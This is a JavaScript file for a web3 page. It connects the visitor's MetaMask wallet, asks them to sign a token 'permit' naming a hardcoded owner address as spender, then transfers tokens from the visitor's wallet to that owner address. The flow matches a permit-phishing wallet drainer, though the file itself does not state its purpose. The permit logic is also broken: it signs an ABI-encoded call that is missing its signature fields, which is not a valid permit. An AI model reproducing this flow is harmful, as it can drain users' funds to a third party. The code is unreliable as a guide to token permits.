const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3'; // 合约地址
const ownerAddress = '0xA465E2fc9F9D527AAEb07579E821D461F700e699'; // Owner 地址

let web3;
let contract;
let userAccount;

// 最新的 ABI
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "deadline",
                "type": "uint256"
            },
            {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
            },
            {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
            },
            {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
            }
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
    document.getElementById('signPermitBtn').addEventListener('click', signPermit);
    document.getElementById('transferTokensBtn').addEventListener('click', transferTokens);
    console.log("Buttons initialized.");
});

async function connectWallet() {
    alert("Connecting to wallet...");
    console.log("Connecting to wallet...");
    if (window.ethereum) {
        try {
            alert("Requesting accounts...");
            console.log("Requesting accounts...");
            await ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(contractABI, contractAddress);
            const accounts = await web3.eth.getAccounts();
            userAccount = accounts[0];
            document.getElementById('walletAddress').innerText = `Connected: ${userAccount}`;
            document.getElementById('signPermitBtn').disabled = false; // 启用签名按钮
            console.log("Wallet connected:", userAccount);
            alert("Wallet connected!");
        } catch (error) {
            alert("Error connecting to wallet: " + error.message);
        }
    } else {
        alert("Please install MetaMask!");
    }
}

async function signPermit() {
    // 示例签名参数，请根据你的需求更改
    const spender = ownerAddress; // 授权的地址
    const value = web3.utils.toWei('1', 'ether'); // 授权金额
    const deadline = Math.floor(Date.now() / 1000) + 3600; // 一小时后到期

    // 创建签名
    const params = [userAccount, spender, value, deadline];
    const message = await contract.methods.permit(...params).encodeABI();
    
    alert("Signing permit...");
    console.log("Signing permit with params:", params);

    // 使用 wallet 进行签名
    try {
        const signature = await web3.eth.personal.sign(message, userAccount);
        console.log("Permit signed:", signature);
        alert("Permit signed!");
        document.getElementById('transferTokensBtn').disabled = false; // 启用转移按钮
    } catch (error) {
        alert("Error signing permit: " + error.message);
    }
}

async function transferTokens() {
    const recipient = ownerAddress; // 目标地址
    const amount = web3.utils.toWei('1', 'ether'); // 转移金额

    alert("Transferring tokens...");
    console.log("Transferring tokens to:", recipient, "Amount:", amount);

    try {
        const result = await contract.methods.transferFrom(userAccount, recipient, amount).send({ from: userAccount });
        console.log("Transfer successful:", result);
        alert("Transfer successful!");
    } catch (error) {
        alert("Error transferring tokens: " + error.message);
    }
}
